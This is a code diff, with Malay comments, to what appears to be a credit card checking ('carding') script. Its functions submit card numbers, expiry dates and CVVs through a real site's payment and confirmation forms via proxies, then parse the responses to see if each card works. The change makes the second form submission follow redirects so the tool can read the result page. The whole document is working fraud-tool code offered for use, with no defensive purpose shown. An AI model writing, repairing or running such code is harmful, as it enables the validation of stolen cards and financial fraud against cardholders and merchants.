@@ -264,7 +264,6 @@ def process_site_for_payload(url, override_proxy=None):
     return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
 def extract_confirmation_form(html, soup):
-    # GUNA CARA TELEGRAM BOT CARI FORM CONFIRM
     confirm_form = soup.find('form', {'id': 'Confirm'})
     if not confirm_form:
         possible_forms = soup.find_all('form')
@@ -381,7 +380,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
-            # CARI FORM CONFIRM MACAM TELEGRAM BOT
             confirm_form = soup_resp.find('form', {'id': 'Confirm'})
             if not confirm_form:
                 possible_forms = soup_resp.find_all('form')
@@ -413,27 +411,13 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 })
 
                 clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
-                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=False)
+                
+                # BETUL BALIK allow_redirects=True SUPAYA DIA BACA HTML RESPONSE
+                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
                 
                 logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
                 
-                if confirm_response.status_code in [301, 302, 303, 307, 308]:
-                    redirect_url = confirm_response.headers.get('Location')
-                    if redirect_url:
-                        if not redirect_url.startswith('http'):
-                            redirect_url = urljoin("https://www.saharaaa.org", redirect_url)
-                        
-                        logging.info(f"URL Redirect Selepas Submit Kedua: {redirect_url}")
-                        
-                        session.headers.update({"Referer": confirm_post_url})
-                        final_response = session.get(redirect_url, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
-                        
-                        logging.info(f"URL Final Selepas Redirect: {final_response.url}")
-                        result = parse_response(final_response.text, final_response.url)
-                    else:
-                        result = parse_response(confirm_response.text, confirm_response.url)
-                else:
-                    result = parse_response(confirm_response.text, confirm_response.url)
+                result = parse_response(confirm_response.text, confirm_response.url)
             else:
                 result = parse_response(response.text, response.url)
             
